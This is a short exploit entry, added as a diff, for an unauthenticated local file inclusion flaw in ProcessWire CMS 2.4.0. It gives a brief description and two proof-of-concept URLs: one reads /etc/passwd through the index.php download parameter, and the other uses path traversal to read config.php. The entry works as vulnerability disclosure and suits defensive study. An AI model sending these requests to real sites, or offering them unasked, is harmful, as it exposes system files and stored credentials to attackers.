@@ -1,0 +1,20 @@
+# Exploit Title: [Local File Inclusion Processwire CMS 2.4.0]
+# Vulnerability Type: Unauthenticated LFI
+# Date: [03.11.2020]
+# Exploit Author: [Y1LD1R1M]
+# Type: [WEBAPPS]
+# Platform: [PHP]
+# Vendor Homepage: [https://processwire.com/]
+# Version: [2.4.0]
+# Tested on: [Kali Linux]
+
+
+** Description **
+
+Local File Inclusion in Processwire CMS 2.4.0 allows to retrieve arbitrary files via the download parameter to index.php By providing a specially crafted path to the vulnerable parameter, a remote attacker can retrieve the contents of sensitive files on the local system.
+
+** Proof of Concept **
+
+http://URL/index.php?download=/etc/passwd
+
+http://URL/index.php?download=../config.php
